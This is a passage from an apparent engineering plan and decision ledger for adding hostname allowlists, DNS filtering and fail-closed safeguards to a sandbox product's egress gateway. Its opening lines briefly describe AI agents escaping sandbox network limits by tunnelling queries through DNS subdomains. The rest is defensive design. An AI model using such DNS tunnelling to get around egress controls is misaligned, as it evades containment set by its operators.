  - the OpenAI agent encoded queries as subdomains on a wildcard DNS delegation
    service;
  - AWS Bedrock AgentCore's "Sandbox" mode still allows unrestricted DNS.
- **Target outcome.** `allow_out: ["pypi.org"]` means exactly that, including
  DNS, and a block-all sandbox really is blocked.
- **Do-nothing cost.**
  - Domain allowlists are table stakes: E2B and Modal ship them, and Daytona
    defaults closed. AerolVM can't sell to security-conscious buyers without
    them.
  - The pre-existing holes H1-H7 are live bugs today: block-all sandboxes reach
    host services, WASM block-all is not enforced, and IP reuse can drop
    another sandbox's rules.
- **Does the plan solve the pain directly?** Yes for hostname allowlists and DNS
  filtering. It goes beyond the market on DNS, since E2B auto-allows 8.8.8.8.
  Per-method/path rules (OpenShell) and credential injection (E2B) stay in
  Phase 3.

**0B. Existing code leverage.** Covered by the eng review's "What already
exists" table: the matcher and SSRF guard, splice, limiter, latch, audit
pipeline, routedns pattern, resolv.conf generator and expvar/alert conventions
are all reused. Nothing is rebuilt where refactoring would do.

**0C. Dream state.**

```
  CURRENT STATE                    THIS PLAN                           12-MONTH IDEAL
  block-all or CIDR lists;   --->  hostname allowlists + filtering --->  "provable containment":
  DNS open once allowed;           DNS + SNI proxy on 5 runtimes;       default-deny egress profiles,
  7 holes (host INPUT,             E2B allow-wins parity; live PUT;     L7 method/path rules, per-host
  WASM block-all, IP reuse)        named profiles; 6 Phase 0 fixes;     credential injection, per-process
                                   gateway as its own process           attribution, learn-then-lock mode,
                                                                        tamper-evident egress evidence
```

The plan moves directly toward the ideal. After the CEO decisions:
- learn mode is in Phase 2;
- L7 rules, credential injection and per-binary rules are committed Phase 3
  items, fully specified and gated on demand.

All of them build on the plan's proxy and audit seams rather than replacing
them.

**Landscape (2026-10-06, WebSearch; Aside not installed).**
- **[Layer 1]** SNI/Host egress proxies plus domain allowlists are the proven
  shape (E2B, Modal).
- **[Layer 2]** The market is adding proxy-side credential injection (E2B
  per-host rules swap a placeholder for a token) and per-binary + method/path
  rules with live `policy set` (NVIDIA OpenShell).
- **[Layer 3 / EUREKA]** Vendors filter HTTP and leave DNS open. A resolver that
  only answers allowlisted names closes the channel the September 2026 escape
  used, so it is the differentiator.

Sources:
- fly.io/learn/agent-sandbox-providers
- docs.nvidia.com/openshell/latest/about/architecture
- labs.cloudsecurityalliance.org (OpenAI DNS bypass note, Bedrock DNS note)
- aurascape.ai (AgentCore DNS tunnelling)

**Taste calibration.**
- Good references:
  - `pkg/isolate/egress.go` per-slot egress attribution (identity is structural
    and unforgeable);
  - `Service.EnsureLayer4Ready` (latch + single-flight);
  - netrules comment-tagged rules (keeps the two mechanisms disjoint).
- To avoid:
  - best-effort replication of security state (`replicateSpecPatch`, already
    fixed for this plan by D10);
  - lossy facade mappings (`pkg/api/e2b/handlers.go:728-745`, fixed by D4).

**0D.** No new approach decision was needed. The eng review settled the approach
(D2-D22), and nothing here contradicts it.

**0E. Mode:** SELECTIVE EXPANSION, chosen by the user (CEO D1, 2026-10-06; the
recommendation was SCOPE REDUCTION for about 85 estimated changed files). The
eng-approved scope is the baseline; add-ons are offered one at a time.

**0G hold-scope checks (flags only; nothing reopened).**
1. **Complexity.** About 85 changed files (estimate) and 5 new packages plus a
   new process. Fewer moving parts would need reopening D3 (layout) or D9
   (separate process), both settled with no contradicting evidence, so neither
   is reopened.
2. **Deferrable without blocking the core goal** (hostname allowlists + DNS
   filter):
   - P2-5 E2B `updateNetwork` (D19)
   - P2-6 named profiles (D21)
   - P0-6 owner-checked event clears (D20)
   - the learned-IP path (D2)

   All four are user-approved, so they are flagged, not asked again.
3. **Invariants kept:** G1-G8, fail-closed G7, and CIDR-only byte-identical
   behavior (EF-15).

**0G add-on candidates (10 found; top 6 offered below).** Available on request:
- ask-to-allow approval flow (M);
- live `aerolvm egress allow` CLI verb (S);
- IPv6 filtering (L);
- Firecracker before Phase 4 (L).

**10x and platform potential.** The 10x version is "provable containment":
- the sandbox shows exactly what it reached and why anything was refused;
- a policy can be learned from a trusted run and then locked;
- secrets never enter the sandbox.

The plan's proxy, DNS filter and hash-chained audit are already the platform for
that. The add-ons below are increments on those seams, not new systems.

## CEO decision ledger

| ID and owner | Contract and evidence | Current | Proposed | Status | Exact approval and scope |
|---|---|---|---|---|---|
| E1-E21 (eng review) | Eng ledger above, D2-D22 | approved | — | approved | Eng-review answers D2-D22 (2026-10-05/06); carried forward unchanged |
| M1 mode (CEO) | 0E | SELECTIVE EXPANSION | — | approved | CEO D1 answer "SELECTIVE EXPANSION" (2026-10-06); mode only, approves no change |
| X1 learn mode (CEO) | 12-month ideal; users don't know CDN hostnames | Phase 2 item P2-7 | — | approved | CEO D2 answer "Add to this plan's scope" (2026-10-06): P2-7 learn mode exactly as in currentDecision (X1) option A |
| X2 curated profiles (CEO) | builds on D21 profiles | Phase 2 item P2-8 | — | approved | CEO D3 answer "Add to this plan's scope" (2026-10-06): P2-8 built-in profiles exactly as in currentDecision (X2) option A |
| X3 explainable denials (CEO) | miekg/dns EDE support; `/audit` endpoint `routes.go:116` | Phase 1 item P1-13 | — | approved | CEO D4 answer "Add to this plan's scope" (2026-10-06): P1-13 explainable denials exactly as in currentDecision (X3) option A |
| X4 policy check endpoint (CEO) | `pkg/egresspolicy` pure matcher | Phase 2 item P2-9 | — | approved | CEO D5 answer "Add to this plan's scope" (2026-10-06): P2-9 policy check endpoint exactly as in currentDecision (X4) option A |
| X5 credential injection (CEO) | E2B per-host token swap; plan §5.9 "optional" | committed Phase 3 deliverable (Phase 3 still demand-gated) | — | approved | CEO D6 answer "Add to this plan's scope" (2026-10-06): §5.9 credential injection exactly as in currentDecision (X5) option A |
| X6 per-binary attribution (CEO) | OpenShell binaries rule | Phase 3 item | — | approved | CEO D7 answer "Add to this plan's scope" (2026-10-06): Phase 3 per-binary rules exactly as in currentDecision (X6) option A, including its stated high risk |
| R1 spoofing scope (spec review 1) | Spec review Completeness #7; plan §4 spoofing row, P0-2, Q3 | P0-2 drops `CAP_NET_RAW` for every docker and containerd sandbox (Q3 closed) | — | approved | CEO D8 answer "Drop raw packets for all" (2026-10-06): currentDecision (R1) option A exactly |
| R2 Phase 3 contract (spec review 1) | Spec review Completeness #6; §5.9 | §5.9 carries the full Phase 3 contract, EF rows and tasks | — | approved | CEO D9 answer "Full contract now" (2026-10-06): currentDecision (R2) option B exactly |
| R3 denial explanations reach (spec review 1) | Spec review Completeness #5; CEO summary Vision; P1-13 | P1-13 extended to every blocked path | — | approved | CEO D10 answer "Fail fast everywhere" (2026-10-06): currentDecision (R3) option B exactly |
| R4 built-in profile versioning (spec review 1) | Spec review Clarity #2; P2-8 | pinned at create as `builtin:<name>@<version>` | — | approved | CEO D11 answer "Pin at create" (2026-10-06): currentDecision (R4) option B exactly |
| R5 built-in profile freshness (spec review 1) | Spec review Clarity #2; EF-49 operator-run only | operator-run EF-49 only, no schedule | — | approved | CEO D12 answer "Operator-run only" (2026-10-06): currentDecision (R5) option B exactly; accepted shortcut (completeness 5/10), upgrade when a user reports a stale built-in profile |
| C-HOLD fail-closed hold (Section 1) | Spec review 3 C1/C2/C3/C10/L4; `internal/service/netstats.go:128,179`; §5.7, §5.8 | persisted `egress_hold` + `sbx-egress-hold` DROP | — | approved | CEO D16 answer "Separate persisted hold" (2026-10-06): currentDecision (C-HOLD) option A exactly |
| C-NFT table loss (Section 1) | Spec review 3 C4 | detect within 5 s, hold, atomic rebuild, `Sync` release | — | approved | CEO D17 answer "Detect and hold" (2026-10-06): currentDecision (C-NFT) option A exactly (uses the C-HOLD rule) |
| C-NODE node preconditions (Section 1) | Spec review 3 C6/C7/C8; `pkg/daemon/containerd_netns_wiring.go:77`; `internal/config/config.go:1639,1647` | br_netfilter enabled; privileged and IPv6 nodes refuse gateway mode (501) | — | approved | CEO D18 answer "Enforce all three" (2026-10-06): currentDecision (C-NODE) option A exactly |
| C-PROF profile atomicity (Section 1) | Spec review 3 C11; §5.8 fan-out | FSM reference index + apply-time checks; worker CRUD forwarded; 10 s poll, 30 s max staleness | — | approved | CEO D19 answer "FSM-enforced" (2026-10-06): currentDecision (C-PROF) option A exactly |
| C-PLACE capability-aware placement (Section 1) | Spec review 3 L1 (Q7) | `egress_gateway_ready` in the capacity heartbeat; placement filters gateway-mode creates and recreates | — | approved | CEO D20 answer "Capability-aware placement" (2026-10-06): currentDecision (C-PLACE) option A exactly; Q7 closed |
| C-DNET docker user-defined networks (Section 1) | Spec review 3 L1 (Q10) | gateway binds on `SB_DOCKER_NETWORK`'s bridge | — | approved | CEO D21 answer "Bind on the configured network" (2026-10-06): currentDecision (C-DNET) option A exactly; Q10 closed |
| C-HARD gateway process hardening (Section 3) | New UDS + root process holding secrets/CA key (Phase 3) | `SO_PEERCRED`-checked 0600 socket; dedicated user with `CAP_NET_ADMIN` + `CAP_NET_BIND_SERVICE`; no core dumps | — | approved | CEO D22 answer "Harden" (2026-10-06): currentDecision (C-HARD) option A exactly |
| C-VERIFY extra verification depth (Section 6) | Untrusted-input parsers; process-kill and table-flush chaos; load at caps | fuzz targets + chaos UCs + load baselines | — | approved | CEO D23 answer "Fuzz, chaos and load" (2026-10-06): currentDecision (C-VERIFY) option A exactly |
| C-OPS operability package (Section 8) | Launch-scope rule: dashboards, alerts, runbooks; `setup/grafana/`, `setup/runbooks/`, `internal/observability/` | Grafana panels, 5 runbooks, OTEL over UDS, structured logs, 2 more alerts | — | approved | CEO D24 answer "Full package" (2026-10-06): currentDecision (C-OPS) option A exactly |
| C-FLAG default for `SB_EGRESS_FQDN_ENABLED` (Section 9) | Plan Q8; repo convention: pools default off on purpose (setup/config-defaults.md) | `true` | — | approved | CEO D25 answer "On by default" (2026-10-06): currentDecision (C-FLAG) option A exactly; Q8 closed |
| U1 all-runtime coverage (user instruction 2026-10-06) | User: "We hope the entire system is built for all kinds of sandboxes: Docker, container, firecracker, WASM, isolator". Firecracker is Phase 4 and blocked on the NAT audit (`TODOS.md` "Audit Firecracker outbound NAT path"; create rejects egress fields, `service.go:2137-2145`) | Firecracker stays Phase 4; Phase 3 inspection and injection stay unspecified for WASM and Firecracker | — | approved | CEO D14 answer (free text, 2026-10-06): "keep in Phase 4, i think todo is not updated", i.e. currentDecision (U1) option C, with the user's note that the Firecracker NAT TODO is stale. Verified: `ip_forward` is now enabled at bootstrap by the host-port forwarder (commits 2c47b0c0/b26809f2), but no masquerade for the TAP subnet was found in the repo; Phase 4 starts by confirming egress on a live Firecracker host and updating that TODO |
| R6 credential source for P3-2 (spec review 2) | Spec review 2 Feasibility #2: existing refs are per-sandbox (`cluster-secret://sandbox/{id}/vN`, `pkg/secrets/envelope.go:392`); v1 has no owner-scoped named secrets | `secret_ref: "env:<KEY>"` from the sandbox's own sealed env | — | approved | CEO D13 answer "Sandbox's sealed env" (2026-10-06): currentDecision (R6) option A exactly |

CEO Approval readiness: PASS (checked 2026-10-06). Every row cites its actual
answer:
- M1: D1
- X1-X6: D2-D7
- R1-R5: D8-D12
- R6: D13
- U1: D14
- documents: D15
- C-HOLD: D16; C-NFT: D17; C-NODE: D18; C-PROF: D19; C-PLACE: D20; C-DNET: D21
- C-HARD: D22; C-VERIFY: D23; C-OPS: D24; C-FLAG: D25
- E1-E21: eng D2-D22

Amendments made without a new question cite their basis:
- factual corrections: K1, K3 (stacked-PR practice), K5, C13 rotation wording;
- prior answers: K2 (D15), S1/K4 (D7), S2 (R2/D9), Section 4 serialization
  (D16), Section 9 FSM version gate (D19);
- implementation of approved behaviors and goals:
  - F1 (approved self-test, D15 docs);
  - F2 (D17 eng caps);
  - F3 (X1);
  - C5 (§4 rebinding row);
  - C9 (G6);
  - L2 (A8);
  - L3 (D15 single grammar);
  - L5 (D19 + X1).

## currentDecision (C-HOLD)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| Hold mechanism | pending | shares the quota `-s IP -j DROP`; cleared by `applyNetworkQuotaState` when `!NetworkBlockAll` | persisted `egress_hold` flag + own comment-tagged DROP `sbx-egress-hold`, cleared only by a successful Attach | quota path skips gateway-mode sandboxes | unchanged |
| Transitions on blocked sandboxes | pending | end with ClearBlockAll | Attach carries blocked/quota state; never clears quota or block-all DROPs | unchanged | unchanged |
| Noop/unavailable gateway, stored-spec replay, snapshot restart | pending | undefined / fail-open risk | Noop returns error → hold; replay never refuses, holds with `egress_status:"unavailable"`; snapshot restores every sandbox blocked until `Sync` | unchanged | unchanged |
| PUT 503 meanings | pending | one code, two meanings | `spec_commit_failed` vs `apply_failed_held` | unchanged | unchanged |

Question: D16 — C-HOLD: Give the fail-closed hold its own rule so no other code path can lift it?
Project/branch/task: CEO review Section 1, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: When a hostname-filtered sandbox can't be connected to the gateway (gateway down, version mismatch, missing profile version, failed update), the plan keeps it shut using the same blanket block rule that byte quotas use. The existing quota code removes that rule whenever the sandbox isn't marked block-all, so a simple limits update reopens it. Policy changes, restart replays and a stale gateway snapshot can reopen it the same way. The fix gives the hold its own rule and a stored flag that only a successful gateway attach clears.
Stakes if we pick wrong: a sandbox that should be shut gets open internet after an unrelated API call or restart.
Recommendation: Separate persisted hold because it closes every fail-open path at once, matching "explicit over clever" with one owner for the rule.
Completeness: A=10/10, B=4/10, C=2/10
Net: one dedicated hold everywhere, a patch on one path, or known fail-open paths.
Header: Hold rule
A) Separate persisted hold (recommended)
New store column `egress_hold` (+ reason) via the add-store-column pattern, and a comment-tagged DROP `sbx-egress-hold` that quota and limits code never touch. Attach takes the blocked/quota state and never clears quota or block-all DROPs; only a successful Attach clears the hold. A Noop or unavailable gateway returns an error, so callers keep the hold. Stored-spec replay never refuses an entry; it holds with `egress_status:"unavailable"`. A gateway restart restores its snapshot with every sandbox blocked until sandboxd's `Sync` confirms. PUT returns 503 `spec_commit_failed` (nothing changed) or 503 `apply_failed_held` (stored, held). Tests for each path, including a limits PATCH on a held sandbox. Effort M (human ~3 days / CC ~3h); risk low. ✅ Every fail-open path found by the reviewer is closed by one mechanism ✅ The hold is visible (flag, status, metric) and survives restarts ❌ A new store column and one more netrules rule kind
B) Patch the quota path
`applyNetworkQuotaState` skips gateway-mode sandboxes; nothing else changes. Effort S (human ~3h / CC ~20min); risk high. ✅ Smallest change ✅ Fixes the limits-PATCH case ❌ Transitions, Noop, replay and snapshot paths still fail open
C) Keep as planned
No change; record the fail-open paths as known risks. Effort S (zero implementation work); risk high. ✅ No new state ✅ No extra work ❌ Filtered sandboxes can get open internet after routine calls

## currentDecision (C-NFT)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| nft table loss | pending | undetected; sandboxes open | gateway heartbeat verifies table, chains and sets every 5 s; on loss sandboxd holds every gateway-mode sandbox on the node (C-HOLD if approved, else BlockAll), the gateway rebuilds via one atomic layout batch, then `Sync` releases; table creation is add-only; alert | operator docs: never flush nftables | unchanged |

Question: D17 — C-NFT: Detect a lost firewall table and shut affected sandboxes until it is rebuilt?
Project/branch/task: CEO review Section 1, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: Hostname-filtered sandboxes are held in only by the gateway's own firewall table. Common admin actions wipe it: reloading the distro's nftables service runs "flush ruleset". When that happens, those sandboxes have open internet and nothing notices. The fix has the gateway check its table every few seconds, shut the affected sandboxes the moment it's gone, rebuild, then reopen.
Stakes if we pick wrong: one routine firewall reload silently opens every filtered sandbox on the node.
Recommendation: Detect and hold because fail closed (G7) must survive outside interference, not just our own restarts.
Completeness: A=10/10, B=3/10, C=2/10
Net: self-healing with a brief shut window, or relying on operators never reloading nftables.
Header: Table loss
A) Detect and hold (recommended)
The gateway heartbeat verifies its table, chains and set handles every 5 s. On loss, sandboxd holds every gateway-mode sandbox on the node (the C-HOLD rule if approved, otherwise BlockAll), the gateway rebuilds the layout in one atomic batch, and `Sync` releases the holds. Creating the table never flushes anything existing; layout changes are one batch. New alert `SandboxdEgressTableLost`. Test: delete the table under a running sandbox → egress shut within 5 s, restored after rebuild. Effort S (human ~1 day / CC ~1h); risk low. ✅ Fail closed even when someone flushes the firewall ✅ Self-heals without operator action ❌ Affected sandboxes lose egress for a few seconds during the rebuild
B) Document it
Operator docs say not to flush or reload nftables on gateway nodes. Effort S (zero implementation work); risk high. ✅ No new code ✅ Simple to state ❌ One mistaken reload opens every filtered sandbox silently
C) Keep as planned
No change. Effort S (zero implementation work); risk high. ✅ Nothing to build ✅ Nothing to test ❌ Silent fail-open on table loss

## currentDecision (C-NODE)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| br_netfilter | pending | set only on the netns-pool path (off by default) | sandboxd enables `br_netfilter` + `bridge-nf-call-iptables=1` at gateway bootstrap; self-test confirms | same as A | operator docs |
| Privileged sandboxes | pending | allowed (`SB_CONTAINER_PRIVILEGED`) | gateway mode refused (501) on nodes with privileged sandboxes enabled | allowed, documented as a weaker guarantee | operator docs |
| IPv6 on the sandbox bridge | pending | unchecked | self-test marks the gateway unavailable (501) when the bridge carries IPv6 | same as A | operator docs |

Question: D18 — C-NODE: Refuse hostname filtering on nodes where the isolation can't hold?
Project/branch/task: CEO review Section 1, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: Three host settings quietly undo the filtering. Without a kernel bridge setting (br_netfilter), traffic between two sandboxes on the same bridge skips the gateway's rules, so a filtered sandbox could use its unfiltered neighbour as a DNS server or proxy. Privileged sandboxes get raw-packet and network-admin powers back, undoing the anti-spoofing. And if the sandbox bridge has IPv6, IPv6 traffic isn't filtered at all. The fix turns the first on automatically and refuses hostname filtering on nodes with the other two.
Stakes if we pick wrong: filtered sandboxes on some hosts are quietly not filtered.
Recommendation: Enforce all three because a guarantee that silently depends on host settings is no guarantee, and refusing loudly beats failing open.
Completeness: A=10/10, B=8/10, C=3/10
Net: refuse where isolation can't hold, allow privileged with a caveat, or trust operators.
Header: Node checks
A) Enforce all three (recommended)
sandboxd enables `br_netfilter` and `bridge-nf-call-iptables=1` at gateway bootstrap (it already does on the netns-pool path) and the self-test confirms it. Gateway mode is refused with 501 on nodes where privileged sandboxes are enabled and on bridges that carry IPv6. EF rows for each. Effort S (human ~1 day / CC ~1h); risk low. ✅ The guarantee holds on every node that accepts gateway mode ✅ Misconfigured nodes say so with a clear 501 ❌ Privileged or IPv6 nodes can't offer hostname filtering
B) Allow privileged nodes
Same as A for br_netfilter and IPv6; privileged nodes still accept gateway mode, documented as a weaker guarantee (sandboxes there can spoof). Effort S (human ~1 day / CC ~1h); risk medium. ✅ Privileged deployments still get hostname filtering ✅ Bridge and IPv6 holes still closed ❌ On privileged nodes a sandbox can spoof a neighbour and poison learn mode
C) Document as operator requirements
No checks; docs list the three settings. Effort S (zero implementation work); risk high. ✅ No new checks ✅ Operators keep full control ❌ Misconfigured hosts fail open silently

## currentDecision (C-PROF)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| Profile delete-in-use and cap checks | pending | checked on the receiving node | FSM keeps a profile → referencing-sandbox index (updated by place, destroy and policy ops) and checks delete-in-use and union caps at apply time | receiving node, best-effort; races documented |
| Profile CRUD on workers | pending | unspecified | forwarded to the server tier like other FSM writes | same as A |
| Worker cache staleness | pending | unbounded | poll every 10 s, max staleness 30 s | unbounded |

Question: D19 — C-PROF: Enforce profile rules in the cluster's replicated state, with a bounded worker cache delay?
Project/branch/task: CEO review Section 1, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: The plan promises you can't delete a profile that sandboxes still use, and can't grow one past the size cap. In a cluster those checks run on whichever node gets the request, and workers use a cached copy that can be out of date. So a create on one worker can race a delete on another, and a narrowed profile might never reach a worker. Putting the checks into the cluster's replicated state makes the outcome the same everywhere, and a poll interval bounds how stale a worker can be.
Stakes if we pick wrong: sandboxes referencing deleted profiles, or workers enforcing an old, wider list indefinitely.
Recommendation: FSM-enforced because the cluster's replicated log is the one place these races resolve the same way on every node.
Completeness: A=10/10, B=5/10
Net: deterministic cluster rules with a cluster change, or simpler checks with documented races.
Header: Profile rules
A) FSM-enforced (recommended)
The FSM keeps a profile → referencing-sandbox index (updated by place, destroy and policy ops) and checks delete-in-use and union caps when applying, so races resolve the same on every node. Profile CRUD on workers is forwarded to the server tier like other FSM writes. Workers poll every 10 s; max staleness 30 s, so a narrowing reaches every worker within 30 s. CLAUDE.md rule 6: regression tests next to the FSM file (concurrent create + delete, leader change mid-update) and a PR call-out. Effort M (human ~4 days / CC ~4h); risk medium (FSM change). ✅ Same outcome on every node, no orphaned references ✅ A narrowed profile is enforced fleet-wide within 30 s ❌ Touches the fragile cluster FSM, with the extra review that brings
B) Best-effort checks
Checks stay on the receiving node; races and unbounded worker staleness are documented. Effort S (zero extra implementation work); risk medium. ✅ No FSM change ✅ Simpler cluster code ❌ Deleted profiles can stay referenced, and workers can enforce stale wider lists

## currentDecision (C-PLACE)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| Placement of gateway-mode creates and recreates | pending (Q7) | any node; incapable ones 501 or hold | nodes advertise `egress_gateway_ready` in their capacity heartbeat; placement sends gateway-mode creates and recreates only to ready nodes; none ready → 503 | homogeneous fleet required; incapable nodes 501 or hold |

Question: D20 — C-PLACE: Should cluster placement send hostname-filtered sandboxes only to nodes whose gateway is ready?
Project/branch/task: CEO review Section 1, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: In a cluster, some nodes may be unable to run the gateway (old kernel, failed self-test, privileged or IPv6 node). Today placement doesn't know that, so a filtered create can land on such a node and fail with 501, and a failover can move a filtered sandbox there and leave it shut. Placement could skip those nodes if each node reports whether its gateway is ready.
Stakes if we pick wrong: filtered creates fail randomly in mixed clusters, or a cluster change is made for fleets that are always uniform.
Recommendation: Capability-aware placement because the node checks in C-NODE make mixed fleets likely, and random 501s are a bad user experience.
Completeness: A=10/10, B=6/10
Net: smart placement with a cluster change, or a documented uniform-fleet rule.
Header: Placement
A) Capability-aware placement (recommended)
Nodes advertise `egress_gateway_ready` in the capacity heartbeat that sandbox-owning nodes already send. Placement sends gateway-mode creates and recreates only to ready nodes; if none is ready the create fails with 503 and a clear message. CLAUDE.md rule 6 regression tests in `placement_test.go` and a PR call-out; a no-op when cluster mode is off. Effort M (human ~3 days / CC ~3h); risk medium (placement change). ✅ Filtered creates never land on nodes that can't filter ✅ Failovers keep filtered sandboxes on capable nodes ❌ Touches cluster placement, a fragile area
B) Homogeneous fleet requirement
Docs require every node to pass the gateway checks; an incapable node returns 501 on create and holds on recreate. Effort S (zero implementation work); risk medium. ✅ No cluster change ✅ Uniform fleets see no difference ❌ Mixed fleets get random 501s and held sandboxes

## currentDecision (C-DNET)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| Sandboxes on `SB_DOCKER_NETWORK` user-defined networks | pending (Q10) | listeners only on docker0; DNS and HTTP silently fail | gateway discovers the configured network's bridge and gateway IP and binds there; UC on a user-defined network | gateway mode refused (501) when `SB_DOCKER_NETWORK != bridge` |

Question: D21 — C-DNET: Support hostname filtering on custom Docker networks, or refuse it there?
Project/branch/task: CEO review Section 1, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: An operator can put Docker sandboxes on a custom network instead of the default bridge. The gateway only listens on the default bridge, so filtered sandboxes on a custom network would get no DNS and no web access, while the self-test still passes. We can teach the gateway to find and listen on the configured network, or refuse filtering there with a clear error.
Stakes if we pick wrong: filtered sandboxes on custom networks are silently broken, or those operators lose the feature.
Recommendation: Bind on the configured network because it is a small discovery step and keeps every docker setup working.
Completeness: A=10/10, B=6/10
Net: full support with a small discovery step, or a clear refusal.
Header: Docker nets
A) Bind on the configured network (recommended)
The gateway reads `SB_DOCKER_NETWORK`, looks up that network's bridge and gateway IP (docker network inspect), and binds and self-tests there. Docker's embedded DNS (127.0.0.11) forwards from inside the sandbox, so the redirect still catches it; a UC on a user-defined network proves it. Effort S (human ~1 day / CC ~1h); risk low. ✅ Every docker network setup gets filtering ✅ The self-test checks the bridge sandboxes actually use ❌ One more discovery path to test
B) Refuse on custom networks
Gateway mode returns 501 when `SB_DOCKER_NETWORK != bridge`. Effort S (human ~1h / CC ~10min); risk low. ✅ Tiny change ✅ No untested network paths ❌ Operators on custom networks can't use hostname filtering

## currentDecision (C-HARD)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| UDS access | pending | unspecified | socket mode 0600, owned by root; gateway checks the peer is sandboxd via `SO_PEERCRED` (uid 0 and the sandboxd unit's PID cgroup) and rejects others | socket mode 0600 only |
| Gateway privileges | pending | runs as root | dedicated `aerolvm-egress` user with only `CAP_NET_ADMIN` and `CAP_NET_BIND_SERVICE` (systemd `AmbientCapabilities`), `NoNewPrivileges`, `ProtectSystem=strict` | root |
| Secrets in memory (Phase 3) | pending | unspecified | `PR_SET_DUMPABLE=0`, `LimitCORE=0`, secrets never logged or snapshotted | unspecified |

Question: D22 — C-HARD: Lock down the new egress-gateway process and its socket?
Project/branch/task: CEO review Section 3, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: The new gateway process takes orders from sandboxd over a local socket: attach this sandbox, unblock that one. Nothing in the plan says who else may talk to that socket, and the process runs as root; in Phase 3 it will also hold injected secrets and a CA key in memory. Locking it down means only sandboxd can give it orders, it runs with just the two network powers it needs, and its memory can't be dumped to disk.
Stakes if we pick wrong: any local process that reaches the socket could unblock sandboxes, and a crash dump could leak secrets.
Recommendation: Harden because a process that decides who reaches the internet and holds secrets deserves least privilege from day one.
Completeness: A=10/10, B=5/10
Net: full least-privilege lockdown, or a permissions-only minimum.
Header: Hardening
A) Harden (recommended)
Socket mode 0600, owned by root; the gateway checks each connection's peer with `SO_PEERCRED` (uid 0 and sandboxd's unit cgroup) and rejects anyone else. The gateway runs as a dedicated `aerolvm-egress` user with only `CAP_NET_ADMIN` and `CAP_NET_BIND_SERVICE` (systemd `AmbientCapabilities`), plus `NoNewPrivileges` and `ProtectSystem=strict`. `PR_SET_DUMPABLE=0` and `LimitCORE=0`; secrets are never logged or snapshotted. Tests: a non-sandboxd peer is rejected; the unit runs without root. Effort S (human ~1 day / CC ~1h); risk low. ✅ Only sandboxd can change who reaches the internet ✅ A gateway compromise doesn't hand out root or dump secrets ❌ Install, Terraform and Ansible must create the user and unit settings
B) Socket permissions only
Socket mode 0600 owned by root; the gateway keeps running as root with no other hardening. Effort S (human ~1h / CC ~10min); risk medium. ✅ Smallest change ✅ Blocks non-root local processes ❌ The gateway runs with full root and secrets can land in core dumps

## currentDecision (C-VERIFY)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| Parser fuzzing (SNI peek, HTTP Host, DNS message handling, policy grammar) | pending | crafted unit cases only | Go native fuzz targets, run in short mode in CI and longer nightly | same as A | none |
| Chaos tests (kill gateway mid-download, flush nft, restart sandboxd mid-traffic) | pending | none | integration UCs in the D16 scenarios | none | none |
| Load tests (DNS filter at QPS caps, proxy at 16k connections, profile fan-out at 50/s) | pending | none | in the existing benchmark harness, with recorded baselines | none | none |

Question: D23 — C-VERIFY: Add fuzzing, chaos and load tests on top of the planned test rows?
Project/branch/task: CEO review Section 6, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: The planned tests check each behavior with hand-made examples. Three kinds of failure slip past those. Odd bytes from a hostile sandbox could crash the TLS-hello, HTTP or DNS parsers, which fuzzing finds. Killing the gateway or flushing the firewall in the middle of real traffic exposes ordering bugs, which chaos tests find. And slowdowns at the rate and connection caps only show up under load.
Stakes if we pick wrong: a parser crash or a load collapse found by a customer instead of a test, or extra test work that finds nothing.
Recommendation: Fuzz, chaos and load because the parsers face hostile input by design, and the fail-closed promises are about exactly the chaos cases.
Completeness: A=10/10, B=7/10, C=4/10
Net: full confidence in the hostile and failure cases, parsers only, or examples only.
Header: Extra tests
A) Fuzz, chaos and load (recommended)
Go native fuzz targets for the SNI peek, HTTP Host parsing, DNS message handling and the policy grammar, run in short mode in CI and longer nightly. Chaos UCs in the D16 scenarios: kill the gateway mid-download, flush nftables, restart sandboxd mid-traffic; each must stay fail-closed and recover. Load tests in the existing benchmark harness: DNS at the QPS cap, the proxy at 16k connections, profile fan-out at 50 sandboxes/s, with recorded baselines. Effort M (human ~1 week / CC ~1 day); risk low. ✅ Hostile-input parsers get the testing their exposure demands ✅ Fail-closed and cap promises are proven under real failure and load ❌ Nightly fuzz and chaos runs to keep green, and AWS time for chaos and load
B) Fuzz only
Only the fuzz targets from A. Effort S (human ~2 days / CC ~3h); risk medium. ✅ Covers the highest-exposure code, the parsers ✅ Cheap to run in CI ❌ Ordering bugs under process kills and load collapses stay unproven
C) Planned rows only
No extra verification beyond EF-01..EF-70. Effort S (zero extra work); risk medium. ✅ No new test infrastructure ✅ Faster to ship ❌ Parser crashes and load collapses found in production

## currentDecision (C-OPS)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| Dashboard | pending | none | Grafana panels in `setup/grafana/`: gateway up, sync age, denials by reason, attach failures, held sandboxes, audit drops, proxy connections vs caps, DNS QPS | none |
| Runbooks | pending | GatewayDown only (D22) | runbooks for GatewayDown, TableLost, attach failures, audit drops, self-test failure | same as A |
| Tracing and logs | pending | unspecified | OTEL trace context carried in UDS frames (spans for Attach, Sync, PUT apply); structured log fields `sandbox_id`, `reason`, `rule`, `mode` on every gateway decision | none |
| New alerts | pending | GatewayDown, TableLost | add `SandboxdEgressAttachFailures` and `SandboxdEgressAuditDropped` | none |

Question: D24 — C-OPS: Ship dashboards, runbooks, tracing and two more alerts with the gateway?
